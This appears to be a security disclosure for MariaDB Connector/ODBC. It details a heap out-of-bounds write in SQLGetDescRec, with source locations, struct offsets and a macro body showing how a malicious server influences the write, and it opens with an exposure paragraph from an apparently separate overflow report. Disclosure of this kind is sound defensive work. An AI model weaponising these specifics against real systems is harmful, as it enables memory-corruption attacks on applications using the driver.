Exposure depends on where the identifier comes from. An application that only ever passes literal table names is not reachable. An application that forwards a user-supplied name or search pattern into a catalog lookup is, and that is the documented purpose of these arguments: `TableName` and `ColumnName` on `SQLColumns`, and the equivalents on `SQLProcedures`, `SQLProcedureColumns`, `SQLColumnPrivileges` and `SQLTablePrivileges`, are pattern value arguments in the ODBC specification, which is to say search patterns. Schema browsers, reporting and BI front ends, data catalogues and admin consoles are the realistic shape of an affected caller.

No database privileges beyond those the application already holds are required, and no server cooperation is needed. The overflow happens while the driver is assembling the query string, before anything is sent to the server.

title: Connector/ODBC SQLGetDescRec treats descriptor handle as statement handle, heap OOB write on every call

asset.asset_identifier: MariaDB Server & Connectors - Data corruption, exfiltration, disclosure

vulnerability_information:
Connector/ODBC SQLGetDescRec treats a descriptor handle as a statement handle

`SQLGetDescRec` and `SQLGetDescRecW` in MariaDB Connector/ODBC clear the error record on their handle using the statement-handle macro, on a handle that is a descriptor. The driver therefore writes through a `MADB_Stmt*` that actually points at a smaller `MADB_Desc` object, overrunning it by 13 bytes on every call. The offset of a second write in the same macro is read from a field that the driver fills with the server's version string, so a malicious or MITM server chooses where that write lands.

## Details

The two functions use the wrong macro at `driver/odbc_3_api.cpp:855` and `:874`:

```c
SQLRETURN SQL_API SQLGetDescRec(SQLHDESC DescriptorHandle, ...)
{
  CHECK_STMT_CLEAR_ERROR(DescriptorHandle);
  return MADB_DescGetRec(DescriptorHandle, ...);
```

The two functions immediately above them, `SQLGetDescField` at `:824` and `SQLGetDescFieldW` at `:837`, use `CHECK_DESC_CLEAR_ERROR` on the same parameter, which is the correct one.

`CHECK_STMT_CLEAR_ERROR` expands to `MA_ClearError(SQL_HANDLE_STMT, handle)`, whose statement branch is `MADB_CLEAR_ERROR(&((MADB_Stmt*)Handle)->Error)` at `driver/ma_api_internal.cpp:58`. Taken from the debug information of the built driver:

```bash
sizeof(MADB_Desc)                 = 720
offsetof(MADB_Desc,  Error)       = 96
offsetof(MADB_Stmt,  Error)       = 192
offsetof(MADB_Error, SqlErrorMsg) = 24
offsetof(MADB_Error, SqlState)    = 537
```

So the driver treats `desc + 192` as a `MADB_Error`. Two consequences follow from the body of the macro in `driver/ma_error.h:166`:

```c
#define MADB_CLEAR_ERROR(a) do { \
  (a)->SqlState[0]= (a)->SqlState[1]= (a)->SqlState[2]= (a)->SqlState[3]= (a)->SqlState[4]= '0'; \
  (a)->SqlErrorMsg[(a)->PrefixLen]= 0; \
```
